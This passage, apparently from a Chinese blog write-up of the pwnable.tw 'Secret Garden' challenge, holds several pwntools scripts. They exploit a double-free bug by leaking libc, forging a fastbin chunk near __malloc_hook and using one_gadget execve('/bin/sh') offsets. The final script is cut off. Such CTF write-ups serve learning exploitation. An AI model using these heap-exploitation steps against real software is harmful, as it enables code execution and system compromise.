class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v0; <span class="comment">// rbx</span></span><br><span class="line">  _DWORD *v1; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = flower_list;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (_DWORD *)*v0;</span><br><span class="line">    <span class="keyword">if</span> ( *v0 &amp;&amp; !*v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(v1);</span><br><span class="line">      *v0 = <span class="number">0L</span>L;</span><br><span class="line">      --flower_num;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v0 != &amp;flower_list[<span class="number">100</span>] );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>每朵花的结构如下：0x28的堆块前8个字节是存在位，接下来的8个字节是name堆块的地址，接下来的0x18个字节保存颜色名字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    bss                                     malloc(0x28)</span><br><span class="line">+----------+                +--------+--------+---------------------------+</span><br><span class="line">|          |                |        |        |                           |</span><br><span class="line">|  list[0] +---------------&gt;+  0x1   | &amp;name  |          color            |</span><br><span class="line">|          |                |        |        |                           |</span><br><span class="line">+----------+                +--------+---+----+---------------------------+</span><br><span class="line">|          |                             |</span><br><span class="line">|          |                             v</span><br><span class="line">|          |                +------------+--------------------------------+</span><br><span class="line">|          |                |                                             |</span><br><span class="line">|          |                |          name                               |</span><br><span class="line">|          |                |                                             |</span><br><span class="line">|          |                +---------------------------------------------+</span><br><span class="line">|          |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>漏洞点就是del函数里面没有检查花的存在位和清零指针，且堆块大小可控，造成了double free</p><h2 id="调试模版"><a href="#调试模版" class="headerlink" title="调试模版"></a>调试模版</h2><p>为了应对pie等调试升级后的全新模版：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch='amd64',os='linux',log_level='debug')</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">elf = ELF(<span class="string">"./secretgarden"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">io = process(elf.path,env=&#123;<span class="string">"LD_PRELOAD"</span> : libc.path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">elf = ELF(<span class="string">"./secretgarden"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_64.so.6"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10203</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line">s = io.send                                    <span class="comment">#</span></span><br><span class="line">sl = io.sendline                               <span class="comment">#</span></span><br><span class="line">sa = io.sendafter                              <span class="comment">#</span></span><br><span class="line">sla = io.sendlineafter                         <span class="comment">#</span></span><br><span class="line">r = io.recv                                    <span class="comment">#</span></span><br><span class="line">rl = io.recvline                               <span class="comment">#</span></span><br><span class="line">ru = io.recvuntil                              <span class="comment">#</span></span><br><span class="line">it = io.interactive                            <span class="comment">#</span></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">b'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">b'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; : &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># base addr</span></span><br><span class="line">gdb_text_base = int(os.popen(<span class="string">"pmap &#123;&#125;"</span>.format(io.pid)).readlines()[<span class="number">1</span>][<span class="number">4</span>:<span class="number">16</span>], <span class="number">16</span>)</span><br><span class="line">gdb_libc_base = int(os.popen(<span class="string">"pmap &#123;&#125;| grep libc"</span>.format(io.pid)).readlines()[<span class="number">0</span>][<span class="number">4</span>:<span class="number">16</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug function</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr=<span class="number">0</span>,cmd=<span class="string">''</span>,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE: addr = gdb_text_base + addr</span><br><span class="line">    log.warn(<span class="string">"breakpoint_addr --&gt; 0x%x"</span> % addr)</span><br><span class="line">    gdb.attach(io,<span class="string">"b *&#123;&#125;\nc\n"</span>.format(hex(addr))+cmd) </span><br><span class="line"></span><br><span class="line">add     = <span class="keyword">lambda</span> len,name,color :  (sla(<span class="string">"choice : "</span>,<span class="string">"1"</span>),sla(<span class="string">"name :"</span>,str(len)),sla(<span class="string">"flower :"</span>,name),sla(<span class="string">"flower :"</span>,color))</span><br><span class="line">show    = <span class="keyword">lambda</span>                :  (sla(<span class="string">"choice : "</span>,<span class="string">"2"</span>))</span><br><span class="line">rm      = <span class="keyword">lambda</span> num            :  (sla(<span class="string">"choice : "</span>,<span class="string">"3"</span>),sla(<span class="string">"garden:"</span>,str(num)))</span><br><span class="line">clear   = <span class="keyword">lambda</span>                :  (sla(<span class="string">"choice : "</span>,<span class="string">"4"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="堆排布泄漏libc"><a href="#堆排布泄漏libc" class="headerlink" title="堆排布泄漏libc"></a>堆排布泄漏libc</h3><p>我们现在拥有地址写的能力，但是不知道写哪，所以首先要做的是泄漏地址信息，思路是free一个unsortedbin，通过main_arena泄漏libc基址，因为我们del花后，存在位会清空，所以我们还是需要申请回来才能输出信息，同时add时通过read函数来获取输入，不会添加截断字符，所以满足泄漏条件</p><p>需要注意有两点：</p><ol><li>我们还需要malloc一个fastbin来防止我们的unsortedbin被top chunk合并</li><li>我们再次申请的时候题目并不会用之前申请的位于flower_list[0]的0x28的堆块，会再次申请一个堆块放在flower_list[1]中，所以我们需要预备好一个0x30的堆块放到fastbin中准备使用，以免我们放入unsortedbin中的堆块被切割</li></ol><p>这里本地的libc和题目给的libc并不一样，但是我们只需要更改<code>io = process(elf.path,env={&quot;LD_PRELOAD&quot; : libc.path})</code>的libc就可以强行加载我们所需的libc（猜测大版本需要一样）</p><p>那我找了一下午题目的libc版本究竟图个啥….淦</p><p>这里使用的是gdb的gef插件，看堆感觉方便一点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch='amd64',os='linux',log_level='debug')</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">elf = ELF(<span class="string">"./secretgarden"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_64.so.6"</span>)</span><br><span class="line">io = process(elf.path,env=&#123;<span class="string">"LD_PRELOAD"</span> : libc.path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">elf = ELF(<span class="string">"./secretgarden"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_64.so.6"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10203</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line">s = io.send                                    <span class="comment">#</span></span><br><span class="line">sl = io.sendline                               <span class="comment">#</span></span><br><span class="line">sa = io.sendafter                              <span class="comment">#</span></span><br><span class="line">sla = io.sendlineafter                         <span class="comment">#</span></span><br><span class="line">r = io.recv                                    <span class="comment">#</span></span><br><span class="line">rl = io.recvline                               <span class="comment">#</span></span><br><span class="line">ru = io.recvuntil                              <span class="comment">#</span></span><br><span class="line">it = io.interactive                            <span class="comment">#</span></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">b'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">b'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; : &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># base addr</span></span><br><span class="line">gdb_text_base = int(os.popen(<span class="string">"pmap &#123;&#125;"</span>.format(io.pid)).readlines()[<span class="number">1</span>][<span class="number">4</span>:<span class="number">16</span>], <span class="number">16</span>)</span><br><span class="line">gdb_libc_base = int(os.popen(<span class="string">"pmap &#123;&#125;| grep libc"</span>.format(io.pid)).readlines()[<span class="number">0</span>][<span class="number">4</span>:<span class="number">16</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug function</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr=<span class="number">0</span>,cmd=<span class="string">''</span>,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE: addr = gdb_text_base + addr</span><br><span class="line">    log.warn(<span class="string">"breakpoint_addr --&gt; 0x%x"</span> % addr)</span><br><span class="line">    gdb.attach(io,<span class="string">"b *&#123;&#125;\nc\n"</span>.format(hex(addr))+cmd) </span><br><span class="line"></span><br><span class="line">add     = <span class="keyword">lambda</span> len,name,color :  (sla(<span class="string">"choice : "</span>,<span class="string">"1"</span>),sla(<span class="string">"name :"</span>,str(len)),sla(<span class="string">"flower :"</span>,name),sla(<span class="string">"flower :"</span>,color))</span><br><span class="line">show    = <span class="keyword">lambda</span>                :  (sla(<span class="string">"choice : "</span>,<span class="string">"2"</span>))</span><br><span class="line">rm      = <span class="keyword">lambda</span> num            :  (sla(<span class="string">"choice : "</span>,<span class="string">"3"</span>),sla(<span class="string">"garden:"</span>,str(num)))</span><br><span class="line">clear   = <span class="keyword">lambda</span>                :  (sla(<span class="string">"choice : "</span>,<span class="string">"4"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">add(<span class="number">500</span>,<span class="string">'1'</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'2'</span>,<span class="string">'2'</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="string">'3'</span>,<span class="string">'3'</span>)</span><br><span class="line">rm(<span class="number">0</span>);rm(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">500</span>,<span class="string">''</span>,<span class="string">'4'</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">"flower[3] :"</span>)</span><br><span class="line">libc_addr = uu64(io.recv(<span class="number">6</span>))<span class="number">-0x3c3b0a</span></span><br><span class="line"></span><br><span class="line">leak(<span class="string">"libc"</span>,libc_addr)</span><br><span class="line">leak(<span class="string">"gdb_libc"</span>,gdb_libc_base)</span><br><span class="line">debug(<span class="number">0x107b</span>,<span class="string">'heap chunks\nheap bins'</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="任意地址分配修改-malloc-hook"><a href="#任意地址分配修改-malloc-hook" class="headerlink" title="任意地址分配修改__malloc_hook"></a>任意地址分配修改__malloc_hook</h3><p>原理学习：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#arbitrary-alloc" target="_blank" rel="noopener">fastbin-arbitrary-alloc</a></p><p>因为libc中常利用的函数指针为__malloc_hook和__free_hook，并且题目中的DoubleFree还需要构造size大小合适的伪堆块，所以需要动态调试观察这两个函数指针附近是否可以满足伪堆块的利用条件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#debug(0x107b,"x /200bx "+hex(gdb_libc_base+libc.symbols['__free_hook']-0x50))</span></span><br><span class="line">debug(<span class="number">0x107b</span>,<span class="string">"x /200bx "</span>+hex(gdb_libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x50</span>))</span><br></pre></td></tr></table></figure><p>__free_hook指针周围都是0，但是__malloc_hook周围有值可以错位构造出一个合法的size：0x000000000000007f</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-secret-garden-1.png"  alt=""></p><p>因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#<span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line">    ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>故我们可以构造一个位于__malloc_hook-0x23处，fastbin索引为5的size为0x70的fake chunk，而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch='amd64',os='linux',log_level='debug')</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">elf = ELF(<span class="string">"./secretgarden"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_64.so.6"</span>)</span><br><span class="line">io = process(elf.path,env=&#123;<span class="string">"LD_PRELOAD"</span> : libc.path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">elf = ELF(<span class="string">"./secretgarden"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_64.so.6"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10203</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line">s = io.send                                    <span class="comment">#</span></span><br><span class="line">sl = io.sendline                               <span class="comment">#</span></span><br><span class="line">sa = io.sendafter                              <span class="comment">#</span></span><br><span class="line">sla = io.sendlineafter                         <span class="comment">#</span></span><br><span class="line">r = io.recv                                    <span class="comment">#</span></span><br><span class="line">rl = io.recvline                               <span class="comment">#</span></span><br><span class="line">ru = io.recvuntil                              <span class="comment">#</span></span><br><span class="line">it = io.interactive                            <span class="comment">#</span></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">b'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">b'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; : &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># base addr</span></span><br><span class="line">gdb_text_base = int(os.popen(<span class="string">"pmap &#123;&#125;"</span>.format(io.pid)).readlines()[<span class="number">1</span>][<span class="number">4</span>:<span class="number">16</span>], <span class="number">16</span>)</span><br><span class="line">gdb_libc_base = int(os.popen(<span class="string">"pmap &#123;&#125;| grep libc"</span>.format(io.pid)).readlines()[<span class="number">0</span>][<span class="number">4</span>:<span class="number">16</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug function</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr=<span class="number">0</span>,cmd=<span class="string">''</span>,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE: addr = gdb_text_base + addr</span><br><span class="line">    log.warn(<span class="string">"breakpoint_addr --&gt; 0x%x"</span> % addr)</span><br><span class="line">    gdb.attach(io,<span class="string">"b *&#123;&#125;\nc\n"</span>.format(hex(addr))+cmd) </span><br><span class="line"></span><br><span class="line">add     = <span class="keyword">lambda</span> len,name,color :  (sla(<span class="string">"choice : "</span>,<span class="string">"1"</span>),sla(<span class="string">"name :"</span>,str(len)),sla(<span class="string">"flower :"</span>,name),sla(<span class="string">"flower :"</span>,color))</span><br><span class="line">show    = <span class="keyword">lambda</span>                :  (sla(<span class="string">"choice : "</span>,<span class="string">"2"</span>))</span><br><span class="line">rm      = <span class="keyword">lambda</span> num            :  (sla(<span class="string">"choice : "</span>,<span class="string">"3"</span>),sla(<span class="string">"garden:"</span>,str(num)))</span><br><span class="line">clear   = <span class="keyword">lambda</span>                :  (sla(<span class="string">"choice : "</span>,<span class="string">"4"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">add(<span class="number">500</span>,<span class="string">'1'</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'2'</span>,<span class="string">'2'</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="string">'3'</span>,<span class="string">'3'</span>)</span><br><span class="line">rm(<span class="number">0</span>);rm(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">500</span>,<span class="string">''</span>,<span class="string">'4'</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">"flower[3] :"</span>)</span><br><span class="line">libc_addr = uu64(io.recv(<span class="number">6</span>))<span class="number">-0x3c3b0a</span></span><br><span class="line">leak(<span class="string">"libc"</span>,libc_addr)</span><br><span class="line">leak(<span class="string">"gdb_libc"</span>,gdb_libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_addr + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">fake_chunk = malloc_hook<span class="number">-0x23</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'1'</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'1'</span>,<span class="string">'1'</span>)</span><br><span class="line">rm(<span class="number">4</span>);rm(<span class="number">5</span>);rm(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(fake_chunk),<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'1'</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'1'</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">19</span>+p64(<span class="number">0xdeadbeef</span>),<span class="string">'1'</span>)</span><br><span class="line">debug(<span class="number">0x107b</span>,<span class="string">"x /200bx "</span>+hex(libc_addr+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x50</span>))</span><br><span class="line">add(<span class="number">10</span>,<span class="string">'1'</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>即可成功劫持控制流到0xdeadbeef</p><h3 id="one-gadget利用约束"><a href="#one-gadget利用约束" class="headerlink" title="one_gadget利用约束"></a>one_gadget利用约束</h3><p>因为只能去修改__malloc_hook，而malloc函数的参数一般为数值，所以如果基本无法利用system函数，将数值利用成字符串地址，因为一旦有小数值就会产生非法地址访问。最终还是只能选择one_gadget。</p><p>本题的libc有4个one_gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget libc_64.so.6 </span><br><span class="line">0x45216 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">0xef6c4 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">0xf0567 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] &#x3D;&#x3D; NULL</span><br></pre></td></tr></table></figure><p>调试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug(<span class="number">0xc65</span>)</span><br></pre></td></tr></table></figure><p>调试发现约束都不满足</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-secret-garden-2.png"  alt=""></p><p>参考wp说由于<code>malloc</code>或者<code>free</code>的时候会调用<code>malloc_printerr</code>函数打印错误信息，因此我们可以通过<code>double free</code>来触发<code>malloc_printerr</code>从而触发<code>malloc</code>函数，进而执行<code>malloc_hook</code>。这时<code>one_gadget</code>中的<code>rsp+0x50==0</code>的条件就满足了。</p><p>但是这里我本地没有触发成功，远程倒是直接打通了…不清楚原因</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span 